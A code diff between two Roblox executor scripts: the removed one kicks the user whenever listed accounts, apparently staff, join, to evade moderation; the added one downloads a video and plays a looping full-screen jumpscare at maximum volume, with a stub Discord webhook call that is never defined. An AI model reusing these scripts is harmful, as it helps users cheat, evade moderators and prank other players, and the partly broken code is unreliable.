@@ -1,45 +1,47 @@
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
 
--- Lista de nomes a serem monitorados
-local targetUsernames = {
-    "jake56839ad", "CleitinDoGrau_Eb", "21peteca", "Lucalarte", "SPTmatheus123",
-    "GuilhermeDRTgg", "Briessxz", "hardstyless", "Mundaka", "Isabelaaaaafofs",
-    "HANRLLEY25", "kaleb_iaee", "brunizoraa", "rip_propleyfran", "pepezicador",
-    "Jjhgul", "Dariosantos21048", "JEKER_2009", "tttonas", "MZPlug14k",
-    "Dudubeterotv5", "Sargento_admOficial", "Cassiopia84un", "Hakplays", "Cleo_ptr"
-}
-
--- Converte a lista para uma tabela para verificação rápida
-local targetLookup = {}
-for _, name in ipairs(targetUsernames) do
-    targetLookup[name] = true
+if jumpscare_jeffwuz_loaded and not _G.jumpscarefucking123 == true then
+    warn("Already Loading")
+    return
 end
 
--- Inicializa a configuração global
-getgenv().KickCheck = getgenv().KickCheck or true
+pcall(function() getgenv().jumpscare_jeffwuz_loaded = true end)
 
--- Função para verificar e kickar caso necessário
-local function checkForTargetPlayers()
-    if not getgenv().KickCheck then return end
+getgenv().Notify = false
+local Notify_Webhook = "Your Discord Webhook"
 
-    for _, player in pairs(Players:GetPlayers()) do
-        if targetLookup[player.Name] then
-            warn("Usuário indesejado detectado:", player.Name)
-            LocalPlayer:Kick("Um staff foi detectado no servidor.")
-            break
-        end
-    end
+if not getcustomasset then
+    game:Shutdown() -- Fucked out
 end
 
--- Verifica inicialmente
-checkForTargetPlayers()
+local player = game:GetService("Players").LocalPlayer
 
--- Verifica sempre que um novo jogador entrar
-Players.PlayerAdded:Connect(function(player)
-    if getgenv().KickCheck and targetLookup[player.Name] then
-        warn("Usuário indesejado detectado:", player.Name)
-        LocalPlayer:Kick("Um staff foi detectado no servidor.")
+
+local ScreenGui = Instance.new("ScreenGui")
+local VideoScreen = Instance.new("VideoFrame")
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Name = "JeffTheKillerWuzHere"
+
+VideoScreen.Parent = ScreenGui
+VideoScreen.Size = UDim2.new(1,0,1,0)
+
+writefile("yes.mp4", game:HttpGet("https://github.com/HappyCow91/RobloxScripts/blob/main/Videos/videoplayback.mp4?raw=true"))
+
+VideoScreen.Video = getcustomasset("yes.mp4")
+
+VideoScreen.Looped = true
+VideoScreen.Playing = true
+VideoScreen.Volume = 10
+
+
+if getgenv().Notify == true then
+    if Notify_Webhook == '' then
+        return;
+    else
+        notify_hook()
     end
-end)
-print("check")
+elseif getgenv().Notify == false then
+    return;
+else
+    warn("True or False")
+end
